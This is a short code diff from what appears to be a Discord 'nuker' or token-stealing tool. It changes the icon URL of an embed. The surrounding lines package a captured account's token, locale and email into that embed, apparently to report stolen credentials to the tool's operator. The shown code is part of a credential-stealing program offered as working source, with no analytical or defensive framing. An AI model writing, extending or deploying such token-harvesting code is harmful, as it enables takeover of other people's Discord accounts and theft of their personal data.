@@ -111,7 +111,7 @@ class Main:
             userinfo = nukelib.account_info(token)
             
             # icon url not work
-            embed = DiscordEmbed(title=userinfo["username"], icon_url=f"https://cdn.discordapp.com/avatars/{userinfo['id']}/{userinfo['avatar']}.png", color="656166")
+            embed = DiscordEmbed(title=userinfo["username"], icon_url=f"https://upload.wikimedia.org/wikipedia/commons/thumb/3/3a/Taurus.svg/1024px-Taurus.svg.png", color="656166")
             embed.add_embed_field(name='Token', value=token)
             embed.add_embed_field(name='Locale', value=userinfo["locale"])
             embed.add_embed_field(name='Email', value=userinfo["email"])
